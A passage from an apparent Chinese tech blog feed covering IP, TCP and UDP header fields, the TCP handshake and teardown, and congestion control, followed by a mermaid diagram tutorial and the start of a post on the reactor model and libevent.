href="#4-1-以太网包头" class="headerlink" title="4.1.以太网包头"></a>4.1.以太网包头</h5><ul><li><p>1.目标MAC地址(48bit)</p><p>数据帧目标主机的MAC地址</p></li><li><p>2.源MAC地址(48bit)</p><p>数据帧发送端主机的MAC地址</p></li><li><p>3.上层协议类型(16bit)</p><p>用于表示上层的协议如(0806表示arp，0800表示ip)</p></li><li><p>4.FCS帧校验序列(32bit)</p><p>数据帧的校验码,用于校验数据帧的完整性</p></li></ul><h4 id="5-IP协议"><a href="#5-IP协议" class="headerlink" title="5.IP协议"></a>5.IP协议</h4><p><strong>网际协议</strong>（英语：Internet Protocol，缩写：<strong>IP</strong>），又称<strong>互联网协议</strong>，是用于<a href="https://zh.wikipedia.org/wiki/%E5%B0%81%E5%8C%85%E4%BA%A4%E6%8F%9B">分组交换</a>数据网络的协议。</p><p>IP是在<a href="https://zh.wikipedia.org/wiki/TCP/IP%E5%8D%8F%E8%AE%AE%E6%97%8F">TCP&#x2F;IP协议族</a>中<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%B1%82">网络层</a>的主要协议，任务仅仅是根据源主机和目的主机的地址来传送数据。为此目的，IP定义了寻址方法和数据报的封装结构。第一个架构的主要版本为<a href="https://zh.wikipedia.org/wiki/IPv4">IPv4</a>，目前仍然是广泛使用的互联网协议，尽管世界各地正在积极部署<a href="https://zh.wikipedia.org/wiki/IPv6">IPv6</a>。</p><h5 id="5-1-IP包头"><a href="#5-1-IP包头" class="headerlink" title="5.1.IP包头"></a>5.1.IP包头</h5><ul><li><p>1.版本号(4bit)</p><p>0100为IPV4,0110为IPV6</p></li><li><p>2.首部长度(4bit)</p><p>指明整个ip包头的长度,ip包头的长度介于20-60个字节之间,因此此字段的单位为四字节</p></li><li><p>3.服务类型(8bit)</p><p>服务器类型（TOS）字段，其中前3个bit表示优先权（现在已经忽略该字段），随后的4个bit表示服务类型，按顺序分别表示为最小时延、最大吞吐量、最高可靠性、最小费用四种。这个4个bit中最多只能有1个bit置位，如果全是0则表示一般服务。最有1个bit为未用位，必须置0</p></li><li><p>4.总长度(16bit)</p><p>表示整个ip包的总字节数</p></li><li><p>5.标识符(16bit)</p><p>16bit的标识字段唯一的标识主机发送的每一份数据报，由于数据在发送时会进行分片,到达目标主机后会将数据包分片进行重组,此标识符用于区别该分片属于哪个数据包,由主机生成具有唯一性。通常每发送一份报文该值加1。该值在数据包分片时，会复制到每一个片中。所以在重组分片包的时候会观察该值，把该值相同的分片收集到一起重组，后面会继续讨论分片。</p></li><li><p>6.标志位(3bit)</p><p>3bit的标识字段每一位都有特定的含义，该字段主要用来分片和重组。第1个bit为保留位（Reserved Bit），一般置位0。第2个bit为不分片位（Don’t Fragment），该位在置1时表示不分片。第3个bit为更多片位（More Fragment），该位表示后面是否还有更多的分片，置位1时表示后面还有，所以除了最后一片报文，其他分片报文该位全部置1。</p></li><li><p>7.片偏移(13bit)</p><p>用于表明次数据包首部偏移数据包真正首部多少个字节,假如发送一个原始数据包1461个byte,那么第一个数据包分片为0,第二个数据包分片为1460</p></li><li><p>8.ttl值(8bit)</p><p>用于表示最多经过的路由器的数量,防止数据包在互联网上一直转发,消耗网络资源,ttl没经过一个路由器就会减1,当ttl减小到0时路由器就会将数据包丢弃,并向源主机回应一个icmp报文,表示ttl超时</p></li><li><p>9.协议号(8bit)</p><p>用于表示上层的协议如</p><table><thead><tr><th align="center">十进制</th><th align="center">十六进制</th><th align="center">关键字</th><th align="center">协议</th><th align="center">引用</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0x06</td><td align="center">TCP</td><td align="center"><a href="https://zh.m.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE"> 传输控制协议（TCP）</a></td><td align="center"><a href="https://tools.ietf.org/html/rfc793">RFC 793</a></td></tr><tr><td align="center">1</td><td align="center">0x01</td><td align="center">ICMP</td><td align="center"><a href="https://zh.m.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E6%8E%A7%E5%88%B6%E6%B6%88%E6%81%AF%E5%8D%8F%E8%AE%AE">互联网控制消息协议（ICMP）</a></td><td align="center"><a href="https://tools.ietf.org/html/rfc792">RFC 792</a></td></tr><tr><td align="center">17</td><td align="center">0x11</td><td align="center">UDP</td><td align="center"><a href="https://zh.m.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE">用户数据报协议（UDP）</a></td><td align="center"><a href="https://tools.ietf.org/html/rfc768">RFC 768</a></td></tr></tbody></table></li><li><p>10.首部校验和(16bit)</p><p>用于校验ip首部是否正确,不对ip包的数据部分进行校验</p><p>计算方法：首先把首部中的该字段全部置0，然后对首部中的每个16bit进行反码求和，得到的值就是该字段的值，填入后。将该数据包发给接收端后，接收端将进行相同的操作，对每个16bit进行反码求和（此时首部校验和字段为非0字段），所以计算后的值若为全1表示正确，否则表示收到的数据包不正确，动作为丢弃。</p></li><li><p>11.源IP地址</p><p>发送端的ip地址</p></li><li><p>12.目标IP地址</p><p>接受方的ip地址</p></li><li><p>13.可选项</p></li></ul><h5 id="5-2-IP地址"><a href="#5-2-IP地址" class="headerlink" title="5.2.IP地址"></a>5.2.IP地址</h5><p>IP地址标识着网络中一个系统的位置。每个IP地址都是由两部分组成：网络号和主机号。网络号标识一个物理的网络，同一个网络上所有的主机需要同一个网络号，该号在整个互联网是唯一的；主机号是网络中的一个工作端、服务器、路由器其他TCP&#x2F;IP主机。对于一个网络号来说主机号是唯一的。每个TCP&#x2F;IP主机由一个逻辑IP地址确定。</p><p>IP地址有两种表示方法：二进制表示、点分十进制表示。<br>每个IP地址为4个字节，由4个8位域组成，称之为8位体。</p><h5 id="5-3-IP地址划分"><a href="#5-3-IP地址划分" class="headerlink" title="5.3.IP地址划分"></a>5.3.IP地址划分</h5><p>IP地址划分为5类</p><ul><li>1.A类地址（ 0.0.0.0 - 127.255.255.255 ）以”0”头，网络段长度为8位，其中可变部分的长度为7位；主机段长度为24位。7位的可变网络段可识别2^7&#x3D;128 (0~127)个网络，其中0和127另有用途，故只有126个可用的A类网络地址。另外，主机位全”0”代表网络本身，全”1”代表网内广播，因此一个A类网络地址可识别的可分配地址有 2^24-2 个。</li><li>2.B类地址（ 128.0.0.0 - 191.255.255.255 ）以”10”开头，网络段长度为16位，可变部分的长度为14位；主机段长度为16位。14位的可变网络段可以识别的网络数为 2^14 个。另外，主机位全”0”与全”1”功能同A类地址，因此一个B类网络可以分配地址有 2^16-2 个。</li><li>3.C类地址（ 192.0.0.0 - 223.255.255.255 ）以”110”开头，网络段长度为24位，其中可变部分的长度为21位；主机段长度为8位。21位的可变网络段可以识别的网络数为 2^21 个。可分配的主机地址是 2^8-2 个。</li><li>4.D类地址（ 224.0.0.0 - 239.255.255.255 ）为组播地址，使用”1110”开头，不分网络段和主机段，有 2^28 个组播地址。用于标识预先定义的一组主机。主机使用组播通信时，可以将组播数据报一次性发送给所有同组的主机。</li><li>5.E类地址（ 240.0.0.0 - 255.255.255.255 ）是保留地址，用于研究使用。以”1111”开头，不区分网络段和主机段，其中32位全1代表本网络内广播，因此E类地址共有 2^28-1 个。</li></ul><p>ip地址又有私有ip地址(主要为了解决ip地址不够用的问题)和特殊ip地址</p><p><strong>私有IP地址</strong></p><p>A类私有ip地址(10.0.0.0&#x2F;8)</p><p>B类私有ip地址(172.16.0.0&#x2F;12)</p><p>C类私有ip地址(192.168.0.0&#x2F;16)</p><p><strong>特殊ip地址</strong></p><p>127.0.0.0&#x2F;8,本地回环地址,用于表示本机,常用于测试</p><p>169.254.0.0&#x2F;16,主要用于DHCP服务器出问题时本地局域网计算机可以继续进行通讯</p><h4 id="6-TCP-x2F-UDP协议"><a href="#6-TCP-x2F-UDP协议" class="headerlink" title="6.TCP&#x2F;UDP协议"></a>6.TCP&#x2F;UDP协议</h4><p><strong>6.1.TCP协议</strong></p><p><strong>传输控制协议</strong>（英语：<strong>T</strong>ransmission <strong>C</strong>ontrol <strong>P</strong>rotocol，缩写：<strong>TCP</strong>）是一种面向连接的、可靠的、基于<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AF%80%E6%B5%81">字节流</a>的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82">传输层</a>通信协议，由<a href="https://zh.wikipedia.org/wiki/IETF">IETF</a>的<a href="https://zh.wikipedia.org/wiki/RFC">RFC</a> <a href="https://tools.ietf.org/html/rfc793">793</a>定义。在简化的计算机网络<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">OSI模型</a>中，它完成第四层传输层所指定的功能。</p><h5 id="TCP包头-20byte-60byte"><a href="#TCP包头-20byte-60byte" class="headerlink" title="TCP包头(20byte~60byte)"></a>TCP包头(20byte~60byte)</h5><ul><li><p>1.源端口(16bit)</p><p>发送端的端口号</p></li><li><p>2.目的端口(16bit)</p><p>目标端的端口号</p></li><li><p>3.序号(32bit)</p><p>顺序号，4个字节，用来标识从 TCP 源端向 TCP 目的端发送的数据字节流，它表示在这个报文段中的第一个数据字节的顺序号。如果将字节流看作在两个应用程序间的单向流动，则 TCP 用顺序号对每个字节进行计数。序号是 32bit 的无符号数，<strong>序号到达 (2^32) － 1 后又从 0 开始。</strong>当建立一个新的连接时， SYN 标志变 1 ，顺序号字段包含由这个主机选择的该连接的初始顺序号 ISN （ Initial Sequence Number ）</p></li><li><p>4.确认号(32bit)</p><p>确认号，4个字节，包含发送确认的一端所期望收到的下一个顺序号。因此，确认序号应当是上次已成功收到数据字节顺序号加 1 。只有 ACK 标志为 1 时确认序号字段才有效</p></li><li><p>5.数据偏移量(4bit)</p><p>包头长度(单位为4字节)</p></li><li><p>6.保留位(6bit)</p><p>保留区域，6位，保留给将来使用，目前必须置为 0</p></li><li><p>7.控制位(6bit)</p><p>URG,为1表示紧急指针值有效,反之无效</p><p>ACK,为1表示确认号有效</p><p>PSH,为1表示带有PUSH标志的数据,指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满。</p><p>RST,用于复位,表示出现了主机崩溃或者错误连接</p><p>SYN,同步序号,为1表示连接请求,用于建立连接和使顺序号同步</p><p>FIN,用于释放连接</p></li><li><p>8.窗口大小(16bit)</p><p>窗口大小，2个字节，表示从确认号开始，本报文的源方可以接收的字节数，即源方接收窗口大小。窗口大小是一个 16bit 字段，因而窗口大小最大为 65535（2^16 - 1）</p></li><li><p>9.校验和(16bit)</p><p>校验和，2个字节，对整个的 TCP 报文段<strong>（包括 TCP 头部和 TCP 数据）</strong>，以 16 位字进行计算所得。这是一个强制性的字段，要求由发送端计算和存储，并由接收端进行验证</p></li><li><p>10.紧急指针(16bit)</p><p>紧急指针，2个字节，是一个正的偏移量，和顺序号字段中的值相加表示紧急数据最后一个字节的序号。 TCP 的紧急方式是发送端向另一端发送紧急数据的一种方式。 只有当URG 标志置 1 时紧急指针才有效</p></li><li><p>11.可选项</p></li></ul><p><strong>TCP三次握手</strong>(重点)</p><p>1.Client将tcp中标志位SYN置为1,并初始化一个序列号x,用于客户端到服务端的会话,发送给服务端请求连接,此时客户端进入SYN_SEND状态</p><p>2.Server收到Client发来的请求连接报文后,会将ACK置为1,并将ack置为x+1,并初始化一个序列号y,用于以后服务端到客户端的会话表示接受连接(客户端到服务端),并将SYN置为1请求和客户端连接(服务端到客户端),此时Server进入SYN_RECV状态</p><p>3.Client收到报文后,客户端到服务端完成连接(Client进入到ESTABLISHED状态),并将ACK置为1表示接受连接(服务端到客户端),服务端收到后,服务端到客户端也完成连接,3次握手完成,此时Client和Server都进入ESTABLISHED状态</p><pre><code class=" mermaid">sequenceDiagram Client-&gt;&gt;+Server:SYN=1,seq=x Server-&gt;&gt;+Client:SYN=1,seq=y,ack=x+1,ACK=1 Client-&gt;&gt;+Server:ACK=1,ack=y+1</code></pre><p><strong>TCP四次挥手</strong>（重点)</p><p>Client或Server均可发起断开连接,这里以客户端发起释放连接为例</p><p>1.Client将标志位FIN置为1,并将序列号seq&#x3D;u(假设此时序列号为u)发送给Server,此时Client进入FIN_WAIT-1状态</p><p>2.Server收到报文后,将ACK标志位置为1,将ack置为u+1发送给Client,表示Server已经接受到Client发来的断开连接请求,Client收到该报文后会进入FIN_WAIT-2状态,此时TCP进入到半连接状态,Client到Server的连接释放,此时Server进入CLOSE-WAIT,此时Server将剩下要发完的数据依次全部发送给Client</p><p>3.Server将剩余要发送完的数据发送完成后,将FIN标志为置为1,ACK置为1,发送给Client,表示释放连接(服务端到客户端),</p><p>4.Client收到该报文后,将标志位ACK置为1,表示接受释放连接,此时Server到客户端的连接释放,TCP4次挥手完成</p><pre><code class=" mermaid">sequenceDiagramClient-&gt;&gt;+Server:FIN=1,seq=uServer-&gt;&gt;+Client:ACK=1,ack=u+1,seq=vServer--&gt;&gt;+Client:DATAServer-&gt;&gt;+Client:FIN=1,ACK=1,seq=w,ack=u+1Client-&gt;&gt;+Server:ACK=1,ack=w+1,seq=u+1</code></pre><p><strong>tcp窗口控制和重发机制</strong></p><p><strong>首先，先考虑ACK未能发送到发送端主机的情况，在窗口一定程度较大时，即使有少部分的确认应答丢失也不会进行数据重发，因为可以通过下一个ACK进行确认</strong></p><p>比如说，你发送1-100，101-200,201-300三个数据段，但是接收端主机的3个对应ACK前两个丢失了，只有201-300的到达，这将会刷新接收端的序列号从而不影响数据传输</p><p><strong>高速重发控制</strong></p><p>如果接收端接收到一个自己一个接收的序号以外的数据时，会针对当前为止收到的数据返回ACK数据包,如果接收端连续三次接受到了三个确认号一样的tcp报文,则表明有数据包丢失了,则进入重发机制,这个过程中几乎不会影响数据交互<strong>（因为即使接收端主机收到的序列号并不连续，也不会将数据丢弃而是暂时保存至缓冲区）</strong>,这种机制比超时重发机制更有效,因此也称为高速重发机制。</p><p><strong>流量控制</strong></p><p>在tcp包头中有一个字段专门用来表明当前主机的窗口大小(即发送端主机不需要接收端发来的确认包就可以发送的最大字节数),这个字段一般会根据实时的网络情况进行自动调整,这个字段越大表明网络吞吐量更大,如果接收端缓冲区面临数据溢出时,窗口大小就会变为一个更小的值,如果，<strong>数据溢出</strong>，但是<strong>过了</strong>发送端的<strong>重发超时时间</strong>还未收到窗口更新的通知，发送端将会发送一个窗口探测的包</p><p><strong>拥塞控制</strong></p><p>有了TCP的窗口控制，收发主机之间不再以一个数据段为单位发送ACK，也能连续发送大量数据包</p><p>计算机网络都处于一个共享的环境。因此也有可能会因为其他主机之间的通信使网络变得拥堵，在网络出现拥堵的时候，如果发送一个较大量的数据，极有可能导致整个网络瘫痪</p><p>因此，TCP在通信一开始的时候会通过一个叫做<strong>慢启动</strong>的算法得出的数值，对收发数据量进行控制</p><p>首先，为了在发送端调节所要发送数据的量，定义了一个叫做“<strong>拥塞窗口</strong>”的概念。于是在慢启动的时候，将这个拥塞窗口的大小设置为1个数据段（1MSS），之后每收到,1次ACK，拥塞窗口的值就加1，在发送数据时，将拥塞窗口的大小与接收端主机通知的窗口大小进行比较，选择较小的值，并且发送比其还要小的数据量</p><p>随着包的每次往返，拥塞窗口也会以1、2、4等指数函数的增长，拥堵状况剧烈还是可能导致网络拥塞的发生。为了防止这些，引入了<strong>慢启动阀值</strong>的概念，只要拥塞窗口的值超出了这个阀值，在每一次收到ACK时，只允许以一种相对缓慢的方式放大拥塞窗口<strong>（MSS字节数*MSS字节数&#x2F;拥塞窗口大小）</strong></p><p>TCP的通信开始时，并没有设置相应的<strong>慢启动阀值</strong>。而是在超时重发时，才会设置为当时拥塞窗口一半的大小</p><p>当重复ACK而触发高速重发时，<strong>慢启动阀值</strong>会设置为当时<strong>窗口大小（实际已发送但未收到ACK的数据量）</strong>一半的大小<strong>（而当时窗口大小会重置为慢启动阀值+3MSS）</strong></p><p><strong>TCP拥塞控制算法</strong></p><p>因为实际的网络环境是瞬息万变的,因此并没有那个算法适用与任何场景,因此在实际的生产环境下应该要对实际的需求和网络环境配置其合适的tcp拥塞控制算法,以达到最佳效果。传统的tcp拥塞控制算法分为以下两类</p><ul><li>基于丢包策略的传统拥塞控制算法</li></ul><p><img src="/images/tcp-1.jpg" alt="基于丢包策略的传统拥塞控制算法"></p><ul><li>基于延时策略的传统拥塞控制算法</li></ul><p><img src="/images/tcp-2.jpg" alt="基于延时策略的传统拥塞控制算法"></p><p><strong>TCP建立连接为什么要三次握手?</strong></p><p>三次握手的目的是建立可靠的通信信道,而可靠的通信信道最基础的就是发送者和接受者发送接受都正常,即三次握手最主要的目的就是确认客户端和服务端发送和接受都是正常的,</p><p>第一次握手,客户端发送出建立连接报文后,自己什么都确认不了,但是服务端一旦接受到客户端发来的申请建立连接报文后,就可以确认客户端发送正常,自己接受正常</p><p>第二次握手,服务端发送确认建立连接报文后,客户端一旦接受到了就可以确认,客户端可以确认自己发送接受正常,对方发送和接受都正常</p><p>第三次握手,客户端发送出确认连接报文后,服务端一旦接收到,就可以确认自己发送接受正常,对方发送和接受都正常,</p><p>至此,客户端和服务端都能确认对方和自己发送和接收数据都是正常的。</p><p><strong>TCP断开连接为什么要进行四次挥手？</strong></p><p>TCP断开连接过程中的四次挥手主要就是为了双方都能确认对方都没有数据发送了。</p><p>由于 TCP 的<strong>半关闭</strong>（half-close）特性，TCP 提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。</p><p>任何一方都可以在数据传送结束后发出连接释放的通知，待对方确认后进入<strong>半关闭状态</strong>。当另一方也没有数据再发送的时候，则发出连接释放通知，对方确认后就<strong>完全关闭</strong>了TCP连接。</p><p>通俗的来说，两次握手就可以释放一端到另一端的 TCP 连接，完全释放连接一共需要四次握手</p><p><strong>tcp三次握手可以携带数据吗?</strong></p><p>第三次握手的时候，是可以携带数据的。但是，第一次、第二次握手绝对不可以携带数据。</p><p>假如第一次握手可以携带数据的话，如果有人要恶意攻击服务器，那他每次都在第一次握手中的 SYN 报文中放入大量的数据，然后疯狂重复发 SYN 报文的话，这会让服务器花费很多时间、内存空间来接收这些报文。</p><p><strong>为什么第二次挥手完成之后客户端到服务端的连接已经释放了,第四次挥手仍然能够发送ACK报文给服务端？</strong></p><p>客户端到服务端连接释放后,只是服务端不在接受来自客户端发送报文的应用数据,而ACK是放在TCP头中的,因此这和客户端到服务端连接释放,但是客户端仍然能够发送ACK报文给服务端并不冲突</p><p><strong>为什么不能用两次握手进行连接？</strong></p><p>答：3次握手完成两个重要的功能，既要双方做好发送数据的准备工作(双方都知道彼此已准备好)，也要允许双方就初始序列号进行协商，这个序列号在握手过程中被发送和确认。现在把三次握手改成仅需要两次握手，死锁是可能发生的。作为例子，考虑计算机S和C之间的通信，假定C给S发送一个连接请求分组，S收到了这个分组，并发送了确认应答分组。按照两次握手的协定，S认为连接已经成功地建立了，可以开始发送数据分组。可是，C在S的应答分组在传输中被丢失的情况下，将不知道S是否已准备好，不知道S建立什么样的序列号，C甚至怀疑S是否收到自己的连接请求分组。在这种情况下，C认为连接还未建立成功，将忽略S发来的任何数据分组，只等待连接确认应答分组。而S在发出的分组超时后，重复发送同样的分组。这样就形成了死锁。</p><p><strong>如果已经建立了连接，但是客户端突然出现故障了怎么办？</strong></p><p>TCP还设有一个保活计时器，显然，客户端如果出现故障，服务器不能一直等下去，白白浪费资源。服务器每收到一次客户端的请求后都会重新复位这个计时器，时间通常是设置为2小时，若两小时还没有收到客户端的任何数据，服务器就会发送一个探测报文段，以后每隔75分钟发送一次。若一连发送10个探测报文仍然没反应，服务器就认为客户端出了故障，接着就关闭连接。</p><p><strong>为什么TCP客户端最后还要发送一次确认呢？</strong></p><p>一句话，主要防止已经失效的连接请求报文突然又传送到了服务器，从而产生错误。如果使用的是两次握手建立连接，假设有这样一种场景，客户端发送了第一个请求连接并且没有丢失，只是因为在网络结点中滞留的时间太长了，由于TCP的客户端迟迟没有收到确认报文，以为服务器没有收到，此时重新向服务器发送这条报文，此后客户端和服务器经过两次握手完成连接，传输数据，然后关闭连接。此时此前滞留的那一次请求连接，网络通畅了到达了服务器，这个报文本该是失效的，但是，两次握手的机制将会让客户端和服务器再次建立连接，这将导致不必要的错误和资源的浪费。如果采用的是三次握手，就算是那一次失效的报文传送过来了，服务端接受到了那条失效报文并且回复了确认报文，但是客户端不会再次发出确认。由于服务器收不到确认，就知道客户端并没有请求连接。</p><h5 id="6-2-UDP协议"><a href="#6-2-UDP协议" class="headerlink" title="6.2.UDP协议"></a>6.2.UDP协议</h5><p>UDP（UserDatagramProtocol）是一个简单的面向消息的传输层协议，尽管UDP提供标头和有效负载的完整性验证（通过校验和），但它不保证向上层协议提供消息传递，并且UDP层在发送后不会保留UDP 消息的状态。因此，UDP有时被称为不可靠的数据报协议。如果需要传输可靠性，则必须在用户应用程序中实现。</p><p>UDP使用具有最小协议机制的简单无连接通信模型。UDP提供数据完整性的校验和，以及用于在数据报的源和目标寻址不同函数的端口号。它没有握手对话，因此将用户的程序暴露在底层网络的任何不可靠的方面。如果在网络接口级别需要纠错功能，应用程序可以使用为此目的设计的传输控制协议（TCP）。</p><h5 id="UDP包头"><a href="#UDP包头" class="headerlink" title="UDP包头"></a>UDP包头</h5><ul><li><p>1.源端口号(16bit)</p><p>发送端的端口号</p></li><li><p>2.目标端口号(16bit)</p><p>目的端的端口号</p></li><li><p>3.总长度(16bit)</p><p>数据包的总长度</p></li><li><p>4.校验和(16bit)</p><p>数据包的校验和</p></li></ul><p><strong>UDP的特点</strong></p><p>1.UDP是无连接的，即发送数据之前不需要建立连接，因此减少了开销和发送数据之前的时延。</p><p>2.UDP使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的连接状态表。</p><p>3.UDP是面向报文的。发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付IP层。UDP对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。因此，应用程序必须选择合适大小的报文。</p><p>4.UDP没有拥塞控制，因此网络出现的拥塞不会使源主机的发送速率降低。很多的实时应用（如IP电话、实时视频会议等）要去源主机以恒定的速率发送数据，并且允许在网络发生拥塞时丢失一些数据，但却不允许数据有太多的时延。UDP正好符合这种要求。</p><p>5.UDP支持一对一、一对多、多对一和多对多的交互通信。</p><p>6.UDP的首部开销小，只有8个字节，比TCP的20个字节的首部要短。</p><p>参考:</p><p>维基百科</p><p><a href="https://segmentfault.com/a/1190000039165592">https://segmentfault.com/a/1190000039165592</a></p><p><a href="https://zhuanlan.zhihu.com/p/53374516">https://zhuanlan.zhihu.com/p/53374516</a></p><p><a href="https://blog.csdn.net/qq_30549833/article/details/60139328">https://blog.csdn.net/qq_30549833/article/details/60139328</a></p><p><a href="https://blog.51cto.com/u_13854765/2163296">https://blog.51cto.com/u_13854765/2163296</a></p><p><a href="https://blog.csdn.net/why_still_confused/article/details/51658930">https://blog.csdn.net/why_still_confused/article/details/51658930</a></p><p><a href="https://zhuanlan.zhihu.com/p/37836445">https://zhuanlan.zhihu.com/p/37836445</a></p><p><a href="https://www.51cto.com/article/685201.html">https://www.51cto.com/article/685201.html</a></p>]]></content>
    
    
    <categories>
      
      <category>计算机基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>markdown画流程图</title>
    <link href="/2022/04/18/markdown%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/"/>
    <url>/2022/04/18/markdown%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="markdown画流程图"><a href="#markdown画流程图" class="headerlink" title="markdown画流程图"></a>markdown画流程图</h1><h4 id="1-mermaid"><a href="#1-mermaid" class="headerlink" title="1.mermaid"></a>1.mermaid</h4><p>mermaid是一种类似于markdown的脚本语言,通过javascript语言将文本转化为图片</p><h5 id="1-流程图"><a href="#1-流程图" class="headerlink" title="1.流程图"></a>1.流程图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">graph TD;<br>    A--&gt;B;<br>    A--&gt;C;<br>    B--&gt;D;<br></code></pre></td></tr></table></figure><p>实际效果</p><pre><code class=" mermaid">graph TD;    A--&gt;B;    A--&gt;C;    B--&gt;D;</code></pre><h5 id="2-时序图"><a href="#2-时序图" class="headerlink" title="2.时序图"></a>2.时序图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sequenceDiagram<br>    Alice-&gt;&gt;John: Hello John, how are you?<br>    John--&gt;&gt;Alice: Great!<br></code></pre></td></tr></table></figure><p>实际效果</p><pre><code class=" mermaid">sequenceDiagram    Alice-&gt;&gt;John: Hello John, how are you?    John--&gt;&gt;Alice: Great!</code></pre><h5 id="3-状态图"><a href="#3-状态图" class="headerlink" title="3.状态图"></a>3.状态图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">stateDiagram<br>    [*] --&gt; s1<br>    s1 --&gt; [*]<br></code></pre></td></tr></table></figure><pre><code class=" mermaid">stateDiagram    [*] --&gt; s1    s1 --&gt; [*]</code></pre><h5 id="4-类图"><a href="#4-类图" class="headerlink" title="4.类图"></a>4.类图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">classDiagram<br>      Animal &lt;|-- Duck<br>      Animal &lt;|-- Fish<br>      Animal &lt;|-- Zebra<br>      Animal : +int age<br>      Animal : +String gender<br>      Animal: +isMammal()<br>      Animal: +mate()<br>      class Duck&#123;<br>          +String beakColor<br>          +swim()<br>          +quack()<br>      &#125;<br>      class Fish&#123;<br>          -int sizeInFeet<br>          -canEat()<br>      &#125;<br>      class Zebra&#123;<br>          +bool is_wild<br>          +run()<br>      &#125;<br></code></pre></td></tr></table></figure><pre><code class=" mermaid">classDiagram      Animal &lt;|-- Duck      Animal &lt;|-- Fish      Animal &lt;|-- Zebra      Animal : +int age      Animal : +String gender      Animal: +isMammal()      Animal: +mate()      class Duck&#123;          +String beakColor          +swim()          +quack()      &#125;      class Fish&#123;          -int sizeInFeet          -canEat()      &#125;      class Zebra&#123;          +bool is_wild          +run()      &#125;</code></pre><h4 id="5-饼图"><a href="#5-饼图" class="headerlink" title="5.饼图"></a>5.饼图</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">pie<br>    title Key elements <span class="hljs-keyword">in</span> Product X<br>    <span class="hljs-string">&quot;Calcium&quot;</span> : 42.96<br>    <span class="hljs-string">&quot;Potassium&quot;</span> : 50.05<br>    <span class="hljs-string">&quot;Magnesium&quot;</span> : 10.01<br>    <span class="hljs-string">&quot;Iron&quot;</span> :  5<br></code></pre></td></tr></table></figure><pre><code class=" mermaid">pie    title Key elements in Product X    &quot;Calcium&quot; : 42.96    &quot;Potassium&quot; : 50.05    &quot;Magnesium&quot; : 10.01    &quot;Iron&quot; :  5</code></pre><p>参考于:<a href="https://zhuanlan.zhihu.com/p/355997933">https://zhuanlan.zhihu.com/p/355997933</a></p>]]></content>
    
    
    <categories>
      
      <category>软件配置和使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基本软件的使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>reactor与libevent</title>
    <link href="/2022/04/17/libevent%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/04/17/libevent%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="reactor模型与libevent"><a href="#reactor模型与libevent" class="headerlink" title="reactor模型与libevent"></a>reactor模型与libevent</h1><h3 id="1-什么是reactor模型"><a href="#1-什么是reactor模型" class="headerlink" title="1.什么是reactor模型?"></a>1.什么是reactor模型?</h3><h4 id="1-1-传统的同步阻塞式io模型"><a href="#1-1-传统的同步阻塞式io模型" class="headerlink" title="1.1.传统的同步阻塞式io模型"></a>1.1.传统的同步阻塞式io模型</h4><p>1.采用阻塞型io来处理事件,每个连接都需要相应的线程来完成工作.</p><p>存在问题:</p><p>当并发数变大时,会引起cpu上下文经常切换,并且要经常创建和销毁线程,系统资源占用较大</p><h4 id="1-2-reactor模型解决高并发"><a href="#1-2-reactor模型解决高并发" class="headerlink" title="1.2.reactor模型解决高并发"></a>1.2.reactor模型解决高并发</h4><ul><li><p>1.基于io多路复用,多个连接共用一个阻塞对象,一个阻塞对象可以同时管理多个连接请求,</p></li><li><p>2.基于线程池技术,解决了经常性的创建和销毁线程,节省了系统资源占用</p></li></ul><h4 id="1-3-reactor模型的核心"><a href="#1-3-reactor模型的核心" class="headerlink" title="1.3.reactor模型的核心"></a>1.3.reactor模型的核心</h4><p>1.Reactor</p><p>Reactor负责监听和分发事件,</p><p>2.Handler</p><p>Handler负责实际处理事件和业务</p><h4 id="1-4-使用epoll实现一个简单的reactor模型"><a 